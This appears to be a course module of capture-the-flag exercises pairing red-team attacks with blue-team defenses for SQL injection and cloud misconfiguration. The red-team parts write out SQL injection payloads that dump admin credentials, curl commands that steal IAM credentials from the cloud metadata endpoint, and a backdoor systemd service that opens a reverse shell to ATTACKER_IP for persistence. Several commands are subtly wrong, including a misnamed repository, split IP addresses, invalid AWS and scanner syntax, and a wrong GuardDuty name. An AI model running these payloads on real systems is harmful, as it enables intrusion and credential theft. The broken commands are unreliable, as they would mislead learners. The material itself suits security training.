# Part 4 Exercises: CTF Challenges & Assessment

## Exercise 1: E-Commerce Platform - Red Team Attack

### Difficulty: Intermediate | Time: 60-90 minutes

### Objectives
- Identify SQL injection vulnerabilities
- Exploit authentication mechanisms
- Extract sensitive data
- Document findings professionally

### Setup
```bash
# Option 1: Use vulnerable DVWA (Damn Vulnerable Web Application)
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker-compose up

# Option 2: Use WebGoat (OWASP)
git clone https://github.com/WebGoat/GoatandWolf.git

# Option 3: Use bWAPP
# Download from: https://sourceforge.net/projects/bwapp/
```

### Attack Walkthrough

**Step 1: Reconnaissance** (15 min)
```bash
# Scan the application
nmap -sV localhost:80
curl -I http://localhost:8080/

# Identify injectable parameters
# Common: search, id, user_id, product_id
# Look for: /search?q=VALUE, /product?id=VALUE

# Check for information disclosure
# Robots.txt, sitemap.xml, source comments, error pages

# Windows/WSL:
Invoke-WebRequest -Uri "http://localhost:8080/" | Select-Object StatusCode, RawContent
```

**Step 2: SQL Injection Testing** (20 min)
```bash
# Test basic payload
curl "http://localhost:8080/search?q=test' OR '1'='1"

# Try UNION-based injection
curl "http://localhost:8080/product?id=1' UNION SELECT version(),NULL,NULL--"

# Extract database information
curl "http://localhost:8080/product?id=1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"

# Dump credentials
curl "http://localhost:8080/product?id=1' UNION SELECT username,password,email FROM admin_users--"

# Windows PowerShell:
$payload = "1' UNION SELECT version(),NULL,NULL--"
$encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
Invoke-WebRequest -Uri "http://localhost:8080/product?id=$encodedPayload"
```

**Step 3: Exploit & Verify** (15 min)
```bash
# Create request file for repeating attacks
cat > attack.txt << 'EOF'
GET /admin/login HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

username=admin&password=extracted_password_from_sqli
EOF

# Or use curl with verbose output
curl -v -X POST http://localhost:8080/admin/login \
  -d "username=admin&password=correct_password" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Capture flag
# FLAG: FLAG{sql_injection_admin_access_xxxxx}
```

### Deliverables
- [ ] Screenshot of SQL injection payload
- [ ] Extracted credentials (admin:password)
- [ ] Flag submission with proof
- [ ] Brief write-up (3-5 paragraphs) explaining:
  - Vulnerability discovered
  - Exploitation technique
  - Data accessed
  - Security impact

### Success Criteria
- **Exploit SQL injection vulnerability** ✓
- **Extract admin credentials** ✓
- **Access authenticated area** ✓
- **Capture flag** ✓
- **Document findings** ✓

---

## Exercise 2: E-Commerce Platform - Blue Team Defense

### Difficulty: Intermediate | Time: 60-90 minutes

### Objectives
- Detect SQL injection attacks in logs
- Implement WAF rules
- Remediate vulnerabilities
- Verify fixes

### Detection Phase (30 min)

```bash
# Step 1: Review access logs for suspicious patterns
grep -E "(UNION|SELECT|OR.*=.*OR|--)" /var/log/apache2/access.log

# Windows IIS:
Get-Content "C:\inetpub\logs\LogFiles\W3SVC1\*.log" | Select-String "UNION"

# Step 2: Count malicious requests per source
awk '{print $1}' /var/log/apache2/access.log | \
  grep -E "(UNION|SELECT)" | \
  sort | uniq -c | sort -rn

# Step 3: Create custom Fail2Ban filter
sudo nano /etc/fail2ban/filter.d/sqli.conf
```

```ini
[Definition]
failregex = ^<HOST>.*(\bUNION\b|\bSELECT\b|' OR '.*).*HTTP/
ignoreregex =
```

```bash
# Step 4: Enable in jail.local
sudo nano /etc/fail2ban/jail.local
```

```ini
[sqli]
enabled = true
port = http,https
filter = sqli
logpath = /var/log/apache2/access.log
maxretry = 2
findtime = 600
bantime = 3600
```

```bash
# Step 5: Restart and monitor
sudo systemctl restart fail2ban
sudo fail2ban-client status sqli
```

### Remediation Phase (30 min)

```bash
# Step 1: Update application code (pseudo-code fix)
# VULNERABLE:
$result = mysq_query("SELECT * FROM users WHERE id = " . $_GET['id']);

# FIXED (parameterized query):
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
$result = $stmt->get_result();
```

```bash
# Step 2: Enable database user restrictions
mysql -u root -p << EOF
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'SecurePassword123!';
GRANT SELECT, INSERT, UPDATE ON ecommerce.* TO 'webapp'@'localhost';
FLUSH PRIVILEGES;
EOF

# Step 3: Enable ModSecurity WAF
sudo apt install libapache2-mod-security2
sudo a2enmod security2
sudo nano /etc/apache2/mods-enabled/security2.conf
# Enable: SecRuleEngine On
sudo systemctl restart apache2

# Step 4: Apply OWASP CRS rules
wget https://github.com/coreruleset/coreruleset/archive/refs/tags/v3.3.0.tar.gz
tar -xzf v3.3.0.tar.gz
sudo cp -r coreruleset-3.3.0/rules/ /usr/share/modsecurity-crs/

# Step 5: Verify patches applied
curl -v "http://localhost/product?id=1' OR '1'='1"
# Should return: 403 Forbidden (request blocked by WAF)
```

### Verification (10 min)

```bash
# Step 1: Confirm WAF is blocking attacks
curl --write-out "%{http_code}" -o /dev/null -s "http://localhost/product?id=1' UNION--"
# Expected: 403 or 418 (Request blocked)

# Step 2: Verify normal traffic still works
curl "http://localhost/product?id=1"
# Expected: 200 OK

# Step 3: Check logs for blocked requests
tail -n 50 /var/log/apache2/error.log | grep ModSecurity
```

### Deliverables
- [ ] Detection log showing identified SQL injection attempts
- [ ] Fail2Ban configuration file with SQLi filter
- [ ] Before/after screenshots showing:
  - Malicious request being blocked
  - Error log entries for blocked attacks
- [ ] Remediation checklist:
  - [ ] Parameterized queries implemented
  - [ ] Database user privileges restricted
  - [ ] WAF rules deployed
  - [ ] Security headers added
- [ ] Test report verifying fixes

### Success Criteria
- **Detect SQL injection attempts** ✓
- **Implement WAF/IDS blocking** ✓
- **Fix vulnerable code** ✓
- **Verify attacks now fail** ✓
- **Document all changes** ✓

---

## Exercise 3: Cloud Misconfiguration - Red Team

### Difficulty: Intermediate-Advanced | Time: 90-120 minutes

### Objectives
- Exploit cloud metadata services
- Escalate privileges
- Demonstrate lateral movement
- Maintain persistence

### Setup Options

```bash
# Option 1: AWS EC2 free tier
aws ec2 run-instances --image-id ami-0c55b159cbfafe1f0 --instance-type t2.micro

# Option 2: Use vulnerable by design environment
# Hack The Box target
# TryHackMe room: "Cloud Metadataservice Exploitation"

# Option 3: Local simulation
# Set up web server that mimics AWS metadata endpoint
docker run -d -p 169.254.169.254:80 metaphsical/metadata-mock
```

### Attack Walkthrough

**Step 1: Metadata Extraction** (20 min)
```bash
# Step 1a: Scan for metadata endpoint
curl http://169.254.169.254/
curl http://169.254.169.254/latest/

# Step 1b: Extract instance metadata (AWS)
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 1c: Get IAM role credentials
ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
# Returns: {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "..."
# }

# Step 1d: Azure equivalent
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Windows/WSL:
(Invoke-WebRequest -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -Headers @{"Metadata"="true"}).Content | ForEach-Object {$_}
```

**Step 2: Privilege Escalation** (25 min)
```bash
# Step 2a: Check sudo privileges
sudo -l
# Output: User www-data may run (root) NOPASSWD: /usr/bin/systemctl

# Step 2b: Exploit systemctl NOPASSWD vulnerability
sudo /usr/bin/systemctl status ssh
sudo /usr/bin/systemctl start malicious-service

# Step 2c: Create malicious service file
cat > /tmp/malicious.service << 'EOF'
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Step 2d: Install and execute service
sudo cp /tmp/malicious.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable malicious.service
sudo systemctl start malicious.service

# Step 2e: On attacker machine, receive reverse shell
nc -lvnp 4444
```

**Step 3: Lateral Movement** (30 min)
```bash
# Step 3a: Discover network topology
ip route show
route -n

# Step 3b: Scan internal network
nmap -sV 10.0.0.0/24 --open -p 22

# Step 3c: Use extracted AWS credentials to assume more roles
AWS_ACCESS_KEY_ID="ASIA..."
AWS_SECRET_ACCESS_KEY="..."
AWS_SESSION_TOKEN="..."

aws sts assume-role --role-arn arn:aws:iam::123456789:role/EC2InstanceRole --role-session-name pentester

# Step 3d: List other instances
aws ec2 describe-instances --region us-east-1

# Step 3e: Connect to discovered instance
ssh -i ~/.aws/aws_key.pem ubuntu@10.0.0.50
ssh -i ~/.aws/aws_key.pem ec2-user@10.0.0.51
```

**Step 4: Flag Retrieval** (15 min)
```bash
# After gaining access to other instance:
find / -name "*flag*" 2>/dev/null
cat /root/flag.txt
# FLAG: FLAG{cloud_lateral_movement_xxxxx}
```

### Deliverables
- [ ] Extracted IAM credentials (screenshot with credentials obscured partially)
- [ ] Proof of privilege escalation (whoami → shows root)
- [ ] Proof of lateral movement (successful SSH to other instance)
- [ ] Flag submission
- [ ] Attack report (2000+ words) including:
  - Methodology
  - Tools used
  - Technical details
  - Recommendations for defenders

### Success Criteria
- **Extract metadata credentials** ✓
- **Escalate to root privilege** ✓
- **Move laterally to other instance** ✓
- **Establish persistence** ✓
- **Capture flag** ✓

---

## Exercise 4: Cloud Misconfiguration - Blue Team

### Difficulty: Intermediate-Advanced | Time: 90 minutes

### Objectives
- Detect credential theft and lateral movement
- Lock down cloud environment
- Implement detective controls
- Verify security posture

### Detection Phase (30 min)

```bash
# Step 1: Review CloudTrail events
aws cloudtrail lookup-events --region us-east-1 | \
  jq '.Events[] | select(.EventName == "AssumeRole" or .EventName == "GetSecurityCredentials")'

# Step 2: Check for unusual API calls
aws cloudtrail lookup-events | jq '.Events[] | .CloudTrailEvent' | \
  grep -E "CreateInstanceProfile|AttachRolePolicy|PutUserPolicy"

# Step 3: Monitor EC2 metadata access
# CloudWatch Insights query:
fields @timestamp, @message, UserIdentity.principalId, eventName
| filter eventName like /GetCallerIdentity|CreateAccessKey/
| stats count() by eventName

# Step 4: Check VPC Flow logs for anomalous traffic
aws ec2 describe-flow-logs --region us-east-1
```

### Remediation Phase (30 min)

```bash
# Step 1: Revoke compromised credentials
AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

# List active access keys
aws iam list-access-keys --user-name ec2-instance-role

# Delete compromised key
aws iam delete-access-key \
  --user-name ec2-instance-role \
  --access-key-id ASIA...

# Step 2: Update IAM role permissions (least privilege)
cat > restricted-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-app-bucket",
        "arn:aws:s3:::my-app-bucket/*"
      ]
    }
  ]
}
EOF

aws iam put-role-policy \
  --role-name EC2InstanceRole \
  --policy-name restricted-policy \
  --policy-document file://restricted-policy.json

# Step 3: Restrict metadata service access
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxx \
  --http-tokens required \
  --http-put-response-hop-limit 1

# Step 4: Enable VPC isolation
# Update security group to restrict internal communication
aws ec2 authorize-security-group-egress \
  --group-id sg-xxxxx \
  --protocol tcp --port 22 --source-security-group sg-xxxxx \
  --group-owner-id 123456789

# Step 5: Implement CloudTrail alerting
aws cloudtrail create-trail --name security-trail --s3-bucket-name trail-bucket

# Step 6: Enable CloudGuard (AWS GuardDuty)
aws guardduty create-detector --enable
```

### Verification (10 min)

```bash
# Step 1: Verify metadata service requires tokens
curl http://169. 254.169.254/latest/meta-data/
# Should fail or require IMDSv2 token

curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Then use token in subsequent requests

# Step 2: Confirm security group rules
aws ec2 describe-security-groups --group-ids sg-xxxxx

# Step 3: Validate IAM permissions
aws iam get-role-policy --role-name EC2InstanceRole --policy-name restricted-policy
```

### Deliverables
- [ ] CloudTrail analysis showing detected malicious actions
- [ ] Before/after IAM policy comparison
- [ ] Security group rule changes
- [ ] Verification that metadata access now requires tokens
- [ ] Remediation report (1500+ words) including:
  - Detected indicators of compromise
  - Timeline of attack
  - Containment actions taken
  - Verification of remediation
  - Future recommendations

### Success Criteria
- **Detect credential theft** ✓
- **Identify lateral movement attempts** ✓
- **Revoke compromised credentials** ✓
- **Tighten IAM permissions** ✓
- **Restrict metadata service** ✓
- **Verify fixes** ✓

---

## Exercise 5: Wireshark Traffic Analysis

### Difficulty: Intermediate | Time: 60 minutes

### Objectives
- Capture network traffic
- Identify protocols and services
- Extract artifacts (credentials, files)
- Analyze attack patterns

### Setup

```bash
# Install Wireshark
# Ubuntu/Debian:
sudo apt install wireshark

# Windows:
# Download from: https://www.wireshark.org/download/

# WSL2: X11 forwarding or use tshark (command-line version)
sudo apt install tshark
```

### Traffic Capture

```bash
# Step 1: Start packet capture
sudo tcpdump -i eth0 -w traffic.pcap

# or with Wireshark GUI:
sudo wireshark

# Step 2: Generate traffic to analyze
# SSH login
ssh user@target

# HTTP request
curl http://target/login

# SQL traffic
mysql -h target -u user -p

# Let capture run for 2-3 minutes, then stop
```

### Analysis Tasks

**Task 1: Protocol Identification** (15 min)
```bash
# Using tshark (WSL/Linux):
tshark -r traffic.pcap | head -50

# Using Wireshark filters:
# SSH: tcp.port == 22
# HTTP: http
# HTTPS: ssl
# DNS: dns
# SMTP: tcp.port == 25
```

**Task 2: Credential Extraction** (15 min)
```bash
# Extract HTTP forms (may contain credentials)
tshark -r traffic.pcap -Y http.request.method==POST \
  -T fields -e http.host -e http.request.uri -e data.data

# Extract unencrypted passwords (if any)
strings traffic.pcap | grep -i "password\|passwd\|pwd"
```

**Task 3: Malicious Pattern Detection** (20 min)
```bash
# Search for SQL injection patterns
tshark -r traffic.pcap | grep -E "UNION|SELECT|--"

# Identify port scanning
tshark -r traffic.pcap | grep -E "SYN.*RST|Connection refused"

# Analyze DNS queries for C2 communication
tshark -r traffic.pcap -Y dns -T fields -e dns.qry.name

# Windows/PowerShell analysis:
# Use Wireshark GUI and apply displays filters as above
```

### Deliverables
- [ ] Screenshot of Wireshark main window with captured traffic
- [ ] List of identified protocols
- [ ] Extracted credentials/artifacts (if any on unencrypted channels)
- [ ] Analysis report (1000+ words) discussing:
  - Traffic patterns
  - Identified services
  - Security implications
  - Recommendations for encryption

### Success Criteria
- **Capture live traffic** ✓
- **Identify multiple protocols** ✓
- **Extract artifacts** ✓
- **Analyze patterns** ✓
- **Professional documentation** ✓

---

## Exercise 6: Comprehensive Security Assessment

### Difficulty: Advanced | Time: 120+ minutes

### Objectives
- Conduct full penetration test
- Combine offensive and defensive skills
- Produce professional report
- Present findings

### Scope
- Target: Your own VPS or HackTheBox target
- Duration: 2-3 hours of testing
- Deliverable: Professional pentest report

### Execution

**Phase 1: Reconnaissance** (20 min)
```bash
nmap -sV -sC -A -T4 target.com
whois target.com
dig target.com +all
```

**Phase 2: Enumeration** (20 min)
```bash
# Web services
nikto -h target.com

# Databases
nmap -p 3306,5432 -sV target.com

# File sharing
nmap -p 139,445 -sV target.com
```

**Phase 3: Vulnerability Assessment** (20 min)
```bash
openvas --target target.com
nessus --scan target.com
```

**Phase 4: Exploitation** (30 min)
- Exploit identified vulnerabilities
- Gain access/escalate privileges
- Document each successful exploitation

**Phase 5: Post-Exploitation** (20 min)
- Establish persistence
- Gather sensitive data (authorized only)
- Prepare evidence

### Report Structure

1. **Executive Summary** (1 page)
   - Overview for non-technical audience
   - Risk rating: Critical/High/Medium/Low
   - Key findings

2. **Detailed Findings** (10-15 pages)
   - Vulnerability descriptions
   - CVSS scores
   - Proof of exploitation
   - Recommendations

3. **Evidence** (5-10 pages)
   - Screenshots
   - Command output
   - Captured data

4. **Remediation**
   - Priority fixes
   - Implementation guidance
   - Verification steps

### Deliverables
- [ ] Professional penetration test report (20-30 pages)
- [ ] Executive summary (PDF)
- [ ] Evidence appendix with screenshots
- [ ] Remediation roadmap

### Success Criteria
- **Identify 3+ vulnerabilities** ✓
- **Exploit at least 1 critical vulnerability** ✓
- **Demonstrate privilege escalation** ✓
- **Professional documentation** ✓
- **Actionable recommendations** ✓

---

## Final Project Checklist

Before submitting final work, verify:

- [ ] All 6 exercises completed
- [ ] Red Team exercises documented with evidence
- [ ] Blue Team exercises showing defensive controls
- [ ] Professional reports using provided templates
- [ ] Screenshots and artifacts included
- [ ] Flags captured where applicable
- [ ] Code/configurations properly commented
  
- [ ] Presentation slides prepared (if required)
- [ ] 30-minute talk outline ready
- [ ] Live demo capability verified
- [ ] Backup plan for technical issues

---

## Additional Resources

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework/
- **CIS Controls**: https://www.cisecurity.org/controls/
- **HackTheBox**: https://www.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/
- **OWASP WebGoat**: https://owasp.org/www-project-webgoat/

---

## Grading Rubric Summary

**Red Team Exercises (40 points)**
- Exploitation success: 15 pts
- Documentation: 15 pts
- Technical depth: 10 pts

**Blue Team Exercises (40 points)**
- Detection capability: 15 pts
- Remediation effectiveness: 15 pts
- Documentation: 10 pts

**Final Project (20 points)**
- Report quality: 10 pts
- Presentation: 10 pts

**TOTAL: 100 points**

---

Good luck with your CTF challenges! Remember: *Always get written authorization before testing any system.*
